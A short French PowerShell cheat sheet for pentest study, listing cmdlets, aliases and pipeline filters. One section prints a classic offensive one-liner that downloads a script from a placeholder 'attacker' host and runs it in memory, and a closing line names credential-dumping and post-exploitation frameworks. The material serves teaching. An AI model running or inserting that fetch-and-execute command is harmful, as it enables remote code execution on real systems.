---
title: PowerShell
category: windows
icon: 🪟
difficulty: Fondamentaux
tags: [powershell, windows, cmdlets, pentest, powersploit, mimikatz]
summary: Concept objet de PowerShell, cmdlets Verb-Noun et alias, pipeline de filtrage, one-liner offensif et frameworks pentest Windows.
updated: 2026-09-25
source: cheatsheet
---

**Concept** : orienté objet, cmdlets au format `Verb-Noun`, output = objets (pas du texte).

| Cmdlet | Alias | Équivalent |
|---|---|---|
| `Get-ChildItem` | `dir`, `ls`, `gci` | lister fichiers |
| `Set-Location` | `cd` | changer dossier |
| `Get-Content` | `cat`, `type` | lire fichier |
| `Write-Output` | `echo` | afficher |
| `Get-Process` | `ps` | processus |
| `Get-Service` | — | services |
| `Get-Command` | — | lister cmdlets |
| `Get-Help <cmd>` | — | doc (= `man`) |
| `Get-LocalUser` / `New-LocalUser` | — | gérer users |

```powershell
Get-Command -Name Remove*                    # wildcards
Get-Process | Where-Object {$_.CPU -gt 100}  # filtre ($_ = objet courant)
Get-Process | Sort-Object CPU -Descending
Get-Process | Select-Object Name, CPU
```

## One-liner offensif classique

Download + exécute en mémoire :

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker/x.ps1')
```

> Frameworks pentest Windows : PowerSploit, PowerView (recon AD), Mimikatz (dump creds), Empire.
